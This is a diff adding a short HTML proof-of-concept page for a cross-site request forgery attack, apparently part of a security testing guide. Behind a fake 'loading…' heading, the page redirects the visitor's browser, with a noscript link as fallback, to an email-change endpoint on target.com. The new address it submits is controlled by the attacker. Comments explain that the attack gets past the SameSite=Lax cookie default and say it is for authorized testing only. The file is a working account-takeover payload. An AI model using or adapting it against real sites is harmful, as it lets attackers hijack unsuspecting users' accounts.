@@ -1,0 +1,11 @@
+<!doctype html>
+<!-- GET state-change CSRF via TOP-LEVEL NAVIGATION (guide §6.1).
+     This WORKS under the default SameSite=Lax, because Lax sends the cookie on top-level GET navigations.
+     Use only for GET-based sensitive actions. Authorized testing only; own test accounts; default browser. -->
+<html><head><meta charset="utf-8"></head>
+<body>
+<h3>loading…</h3>
+<!-- top-level navigation carries the Lax cookie (unlike <img>/<iframe>/fetch) -->
+<script>window.location = "https://target.com/account/email/change?email=attacker@my-inbox.example";</script>
+<noscript><a href="https://target.com/account/email/change?email=attacker@my-inbox.example">continue</a></noscript>
+</body></html>
